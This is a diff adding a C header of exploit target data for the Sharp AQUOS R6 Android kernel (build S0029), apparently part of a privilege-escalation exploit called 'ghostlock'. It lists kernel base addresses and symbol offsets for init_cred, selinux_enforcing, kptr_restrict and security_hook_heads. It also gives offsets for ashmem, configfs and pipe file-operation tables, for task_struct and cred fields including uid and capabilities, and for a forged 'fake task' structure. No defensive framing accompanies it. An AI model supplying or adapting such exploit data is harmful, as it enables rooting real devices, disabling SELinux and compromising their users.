@@ -1,0 +1,183 @@
+/* AQUOS R6 (Judau) / S0031 source-derived target data.
+ * The S0029 production device was verified to execute the rebuilt S0031
+ * el0_svc at the identical image offset. */
+#include "../spacewar/target.h"
+
+#undef BUILD_VARIANT_LABEL
+#undef BUILD_FINGERPRINT
+#define BUILD_VARIANT_LABEL "ghostlock_aquos_r6_s0029"
+#define BUILD_FINGERPRINT "SG/SGA101SH/Judau:11/S0029/01.00.06:user/release-keys"
+
+#undef KIMAGE_TEXT_BASE
+#undef P0_PAGE_OFFSET
+#undef P0_KERNEL_PHYS_LOAD
+#undef KERNELSNITCH_IDENTITY_START
+#undef KERNELSNITCH_IDENTITY_END
+#undef DIRECT_MAP_BASE
+#undef DIRECT_MAP_END
+#undef VMEMMAP_START
+#define KIMAGE_TEXT_BASE 0xffffffc010080000ULL
+#define P0_PAGE_OFFSET 0xffffff8000000000ULL
+#define P0_KERNEL_PHYS_LOAD 0x80600000ULL /* unused by the canonical-VA path */
+#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
+#define KERNELSNITCH_IDENTITY_END   0xffffff8c00000000ULL
+#define DIRECT_MAP_BASE 0xffffff8000000000ULL
+#define DIRECT_MAP_END  0xffffffc000000000ULL
+#define VMEMMAP_START   0xfffffffe00000000ULL
+
+#undef INIT_TASK_OFF
+#undef INIT_CRED_OFF
+#undef INIT_UTS_NS_OFF
+#undef EMPTY_ZERO_PAGE_OFF
+#undef ROOT_TASK_GROUP_OFF
+#undef SELINUX_ENFORCING_OFF
+#undef KPTR_RESTRICT_OFF
+#undef SELINUX_BLOB_SIZES_OFF
+#undef SECURITY_HOOK_HEADS_OFF
+#undef KMALLOC_CACHES_OFF
+#undef ANON_PIPE_BUF_OPS_OFF
+#undef ASHMEM_MISC_FOPS_OFF
+#undef ASHMEM_FOPS_OFF
+#undef ASHMEM_IOCTL_OFF
+#undef ASHMEM_COMPAT_IOCTL_OFF
+#undef ASHMEM_MMAP_OFF
+#undef ASHMEM_OPEN_OFF
+#undef ASHMEM_RELEASE_OFF
+#undef ASHMEM_SHOW_FDINFO_OFF
+#undef CONFIGFS_READ_ITER_OFF
+#undef CONFIGFS_BIN_WRITE_ITER_OFF
+#undef COPY_SPLICE_READ_OFF
+#undef NOOP_LLSEEK_OFF
+#undef CAP_CAPABLE_ACTIVE_OFF
+#define INIT_TASK_OFF                 0x22f9840ULL
+#define INIT_CRED_OFF                 0x2305f50ULL
+#define INIT_UTS_NS_OFF               0x22f95f8ULL
+#define EMPTY_ZERO_PAGE_OFF           0x247f000ULL
+#define ROOT_TASK_GROUP_OFF           0x2491860ULL
+#define SELINUX_ENFORCING_OFF         0x247e001ULL
+#define KPTR_RESTRICT_OFF             0x22179b0ULL
+#define SELINUX_BLOB_SIZES_OFF        0x1f15134ULL
+#define SECURITY_HOOK_HEADS_OFF       0x1f14ac0ULL
+#define KMALLOC_CACHES_OFF            0x1f14618ULL
+#define ANON_PIPE_BUF_OPS_OFF          0x1e1d468ULL
+#define ASHMEM_MISC_FOPS_OFF          0x228dae8ULL
+#define ASHMEM_FOPS_OFF               0x1df74c8ULL
+#define ASHMEM_IOCTL_OFF              0x1398f6cULL
+#define ASHMEM_COMPAT_IOCTL_OFF       0x1398f70ULL
+#define ASHMEM_MMAP_OFF               0x138b23cULL
+#define ASHMEM_OPEN_OFF               0x1397b7cULL
+#define ASHMEM_RELEASE_OFF            0x1397b80ULL
+#define ASHMEM_SHOW_FDINFO_OFF        0x138e420ULL
+#define CONFIGFS_READ_ITER_OFF        0x13950a8ULL
+#define CONFIGFS_BIN_WRITE_ITER_OFF   0x13970c4ULL
+#define COPY_SPLICE_READ_OFF          0x1383a94ULL
+#define NOOP_LLSEEK_OFF               0x138e81cULL
+#define CAP_CAPABLE_ACTIVE_OFF        0x137e67cULL
+
+#undef WAITER_WAKE_STATE_OFF
+#undef WAITER_WW_CTX_OFF
+#define WAITER_WAKE_STATE_OFF 0
+#define WAITER_WW_CTX_OFF 0
+
+#undef FAKE_TASK_PRIO_OFF
+#undef FAKE_TASK_NORMAL_PRIO_OFF
+#undef FAKE_TASK_TASK_GROUP_OFF
+#undef FAKE_TASK_PI_LOCK_OFF
+#undef FAKE_TASK_PI_WAITERS_OFF
+#undef FAKE_TASK_PI_TOP_TASK_OFF
+#undef FAKE_TASK_PI_BLOCKED_ON_OFF
+#undef MM_OWNER_OFF
+#undef TASK_PID_OFF
+#undef TASK_TGID_OFF
+#undef TASK_REAL_PARENT_OFF
+#undef TASK_ATOMIC_FLAGS_OFF
+#undef TASK_REAL_CRED_OFF
+#undef TASK_CRED_OFF
+#undef TASK_COMM_OFF
+#undef TASK_TASKS_OFF
+#undef TASK_SECCOMP_OFF
+#define FAKE_TASK_PRIO_OFF          0x07c
+#define FAKE_TASK_NORMAL_PRIO_OFF   0x084
+#define FAKE_TASK_TASK_GROUP_OFF    0x3d8
+#define FAKE_TASK_PI_LOCK_OFF       0x8dc
+#define FAKE_TASK_PI_WAITERS_OFF    0x8e8
+#define FAKE_TASK_PI_TOP_TASK_OFF   0x8f8
+#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x900
+#define MM_OWNER_OFF                0x330
+#define TASK_PID_OFF                0x650
+#define TASK_TGID_OFF               0x654
+#define TASK_REAL_PARENT_OFF        0x660
+#define TASK_ATOMIC_FLAGS_OFF       0x618
+#define TASK_REAL_CRED_OFF          0x800
+#define TASK_CRED_OFF               0x808
+#define TASK_COMM_OFF               0x818
+#define TASK_TASKS_OFF              0x550
+#define TASK_SECCOMP_OFF            0x8b8
+
+#undef CRED_UID_OFF
+#undef CRED_SECUREBITS_OFF
+#undef CRED_CAPS_OFF
+#undef CRED_SECURITY_OFF
+#define CRED_UID_OFF        0x04
+#define CRED_SECUREBITS_OFF 0x24
+#define CRED_CAPS_OFF       0x28
+#define CRED_SECURITY_OFF   0x78
+
+#undef STRUCT_SLAB_CACHE_OFF
+#undef PIPE_INODE_INFO_STRUCT_SIZE
+#undef PIPE_INODE_INFO_SIZE
+#undef PIPE_HEAD_OFF
+#undef PIPE_TAIL_OFF
+#undef PIPE_MAX_USAGE_OFF
+#undef PIPE_RING_SIZE_OFF
+#undef PIPE_NR_ACCOUNTED_OFF
+#undef PIPE_READERS_OFF
+#undef PIPE_WRITERS_OFF
+#undef PIPE_FILES_OFF
+#undef PIPE_TMP_PAGE_OFF
+#undef PIPE_BUFS_OFF
+#undef PIPE_USER_OFF
+#define STRUCT_SLAB_CACHE_OFF       0x18
+#define PIPE_INODE_INFO_STRUCT_SIZE 0x88
+#define PIPE_INODE_INFO_SIZE        0x88
+#define PIPE_HEAD_OFF               0x38
+#define PIPE_TAIL_OFF               0x3c
+#define PIPE_MAX_USAGE_OFF          0x40
+#define PIPE_RING_SIZE_OFF          0x40
+#define PIPE_NR_ACCOUNTED_OFF       0x3c
+#define PIPE_READERS_OFF            0x44
+#define PIPE_WRITERS_OFF            0x48
+#define PIPE_FILES_OFF              0x4c
+#define PIPE_TMP_PAGE_OFF           0x60
+#define PIPE_BUFS_OFF               0x78
+#define PIPE_USER_OFF               0x80
+
+#undef FOPS_LLSEEK_OFF
+#undef FOPS_READ_OFF
+#undef FOPS_WRITE_OFF
+#undef FOPS_READ_ITER_OFF
+#undef FOPS_WRITE_ITER_OFF
+#undef FOPS_OPEN_OFF
+#undef FOPS_RELEASE_OFF
+#undef FOPS_SPLICE_READ_OFF
+#undef FOPS_SHOW_FDINFO_OFF
+#define FOPS_LLSEEK_OFF      0x08
+#define FOPS_READ_OFF        0x10
+#define FOPS_WRITE_OFF       0x18
+#define FOPS_READ_ITER_OFF   0x20
+#define FOPS_WRITE_ITER_OFF  0x28
+#define FOPS_OPEN_OFF        0x70
+#define FOPS_RELEASE_OFF     0x80
+#define FOPS_SPLICE_READ_OFF 0xc8
+#define FOPS_SHOW_FDINFO_OFF 0xe0
+
+#undef CFG_PAGE_OFF
+#undef CFG_NEEDS_READ_FILL_OFF
+#undef CFG_BIN_BUFFER_OFF
+#undef CFG_BIN_BUFFER_SIZE_OFF
+#undef CFG_CB_MAX_SIZE_OFF
+#define CFG_PAGE_OFF            0x10
+#define CFG_NEEDS_READ_FILL_OFF 0x50
+#define CFG_BIN_BUFFER_OFF      0x58
+#define CFG_BIN_BUFFER_SIZE_OFF 0x60
+#define CFG_CB_MAX_SIZE_OFF     0x64
